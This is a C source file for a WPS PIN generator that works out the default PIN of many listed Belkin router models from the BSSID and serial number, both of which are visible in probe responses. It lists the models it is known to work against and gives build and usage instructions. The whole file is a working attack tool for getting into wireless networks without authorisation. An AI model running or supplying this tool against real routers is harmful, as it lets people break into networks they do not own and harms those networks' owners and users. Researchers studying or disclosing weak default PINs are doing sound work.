/*
 * WPS pin generator for some Belkin routers. Default pin is generated from the
 * BSSID and serial number. BSSIDs are not encrypted and the serial number is
 * included in the WPS information element contained in 802.11 probe response
 * packets.
 *
 * Known to work against:
 *
 *  o F9K1001v4         [Broadcom, Arcadyan, SuperTask!]
 *  o F9K1001v5         [Broadcom, Arcadyan, SuperTask!]
 *  o F9K1002v1         [Realtek, SerComm]
 *  o F9K1002v2         [Ralink, Arcadyan]
 *  o F9K1002v5         [Broadcom, Arcadyan]
 *  o F9K1103v1         [Ralink, Arcadyan, Linux]
 *  o F9K1112v1         [Broadcom, Arcadyan, Linux]
 *  o F9K1113v1         [Broadcom, Arcadyan, Linux]
 *  o F9K1105v1         [Broadcom, Arcadyan, Linux]
 *  o F6D4230-4v2       [Ralink, Arcadyan, Unknown RTOS]
 *  o F6D4230-4v3       [Broadcom, Arcadyan, SuperTask!]
 *  o F7D2301v1         [Ralink, Arcadyan, SuperTask!]
 *  o F7D1301v1         [Broadcom, Arcadyan, Unknown RTOS]
 *  o F5D7234-4v3       [Atheros, Arcadyan, Unknown RTOS]
 *  o F5D7234-4v4       [Atheros, Arcadyan, Unknown RTOS]
 *  o F5D7234-4v5       [Broadcom, Arcadyan, SuperTask!]
 *  o F5D8233-4v1       [Infineon, Arcadyan, SuperTask!]
 *  o F5D8233-4v3       [Ralink, Arcadyan, Unknown RTOS]
 *  o F5D9231-4v1       [Ralink, Arcadyan, SuperTask!]
 *
 * Known to NOT work against:
 *
 *  o F9K1001v1         [Realtek, SerComm, Unknown RTOS]
 *  o F9K1105v2         [Realtek, SerComm, Linux]
 *  o F6D4230-4v1       [Ralink, SerComm, Unknown RTOS]
 *  o F5D9231-4v2       [Ralink, SerComm, Unknown RTOS]
 *  o F5D8233-4v4       [Ralink, SerComm, Unknown RTOS]
 *
 * Build with:
 *
 *  $ gcc -Wall pingen.c -o pingen
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

int char2int(char c)
{
    char buf[2] = { 0 };

    buf[0] = c;
    return strtol(buf, NULL, 16);
}

int wps_checksum(int pin)
{
    int div = 0;

    while(pin)
    {
        div += 3 * (pin % 10);
        pin /= 10;
        div += pin % 10;
        pin /= 10;
    }

    return ((10 - div % 10) % 10);
}

int pingen(char *mac, char *serial)
{
#define NIC_NIBBLE_0    0
#define NIC_NIBBLE_1    1
#define NIC_NIBBLE_2    2
#define NIC_NIBBLE_3    3

#define SN_DIGIT_0      0
#define SN_DIGIT_1      1
#define SN_DIGIT_2      2
#define SN_DIGIT_3      3

    int sn[4], nic[4];
    int mac_len, serial_len;
    int k1, k2, pin;
    int p1, p2, p3;
    int t1, t2;

    mac_len = strlen(mac);
    serial_len = strlen(serial);

    /* Get the four least significant digits of the serial number */
    sn[SN_DIGIT_0] = char2int(serial[serial_len-1]);
    sn[SN_DIGIT_1] = char2int(serial[serial_len-2]);
    sn[SN_DIGIT_2] = char2int(serial[serial_len-3]);
    sn[SN_DIGIT_3] = char2int(serial[serial_len-4]);

    /* Get the four least significant nibbles of the MAC address */
    nic[NIC_NIBBLE_0] = char2int(mac[mac_len-1]);
    nic[NIC_NIBBLE_1] = char2int(mac[mac_len-2]);
    nic[NIC_NIBBLE_2] = char2int(mac[mac_len-3]);
    nic[NIC_NIBBLE_3] = char2int(mac[mac_len-4]);

    k1 = (sn[SN_DIGIT_2] + 
          sn[SN_DIGIT_3] +
          nic[NIC_NIBBLE_0] + 
          nic[NIC_NIBBLE_1]) % 16;

    k2 = (sn[SN_DIGIT_0] +
          sn[SN_DIGIT_1] +
          nic[NIC_NIBBLE_3] +
          nic[NIC_NIBBLE_2]) % 16;

    pin = k1 ^ sn[SN_DIGIT_1];
    
    t1 = k1 ^ sn[SN_DIGIT_0];
    t2 = k2 ^ nic[NIC_NIBBLE_1];
    
    p1 = nic[NIC_NIBBLE_0] ^ sn[SN_DIGIT_1] ^ t1;
    p2 = k2 ^ nic[NIC_NIBBLE_0] ^ t2;
    p3 = k1 ^ sn[SN_DIGIT_2] ^ k2 ^ nic[NIC_NIBBLE_2];
    
    k1 = k1 ^ k2;

    pin = (pin ^ k1) * 16;
    pin = (pin + t1) * 16;
    pin = (pin + p1) * 16;
    pin = (pin + t2) * 16;
    pin = (pin + p2) * 16;
    pin = (pin + k1) * 16;
    pin += p3;
    pin = (pin % 10000000) - (((pin % 10000000) / 10000000) * k1);
    
    return (pin * 10) + wps_checksum(pin);
}

int main(int argc, char *argv[])
{
    char *mac = NULL, *serial = NULL;

    if(argc != 3)
    {
        fprintf(stderr, "\nUsage: %s <bssid> <serial>\n\n", argv[0]);
        fprintf(stderr, "Only the last 2 octects of the BSSID are required.\n");
        fprintf(stderr, "Only the last 4 digits of the serial number are required.\n\n");
        fprintf(stderr, "Example:\n\n");
        fprintf(stderr, "\t$ %s 010203040506 1234GB1234567\n", argv[0]);
        fprintf(stderr, "\t$ %s 0506 4567\n\n", argv[0]);
        return EXIT_FAILURE;
    }

    mac = argv[1];
    serial = argv[2];

    /*
     * Only really need the last 2 octets of the MAC 
     * and the last 4 digits of the serial number.
     */
    if(strlen(mac) < 4 || strlen(serial) < 4)
    {
        fprintf(stderr, "MAC or serial number too short!\n");
        return EXIT_FAILURE;
    }
    else if(strchr(mac, ':') || strchr(mac, '-'))
    {
        fprintf(stderr, "Do not include colon or hyphen delimiters in the MAC address!\n");
        return EXIT_FAILURE;
    }

    printf("Default pin: %08d\n", pingen(mac, serial));

    return EXIT_SUCCESS;
}
